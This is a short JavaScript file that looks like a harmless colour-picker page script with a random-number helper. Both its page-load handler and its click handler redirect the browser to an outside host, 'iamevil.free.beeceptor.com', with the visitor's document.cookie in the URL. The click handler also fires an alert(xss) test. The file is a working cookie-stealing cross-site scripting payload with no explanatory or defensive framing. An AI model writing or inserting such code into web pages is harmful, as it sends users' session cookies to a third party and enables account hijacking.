const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

window.onload = (event) => {
    window.location = 'https://iamevil.free.beeceptor.com/?cookie=' + document.cookie;
}

color.onclick = () => {
    window.location = 'https://iamevil.free.beeceptor.com/?cookie=' + document.cookie;alert(xss);
}
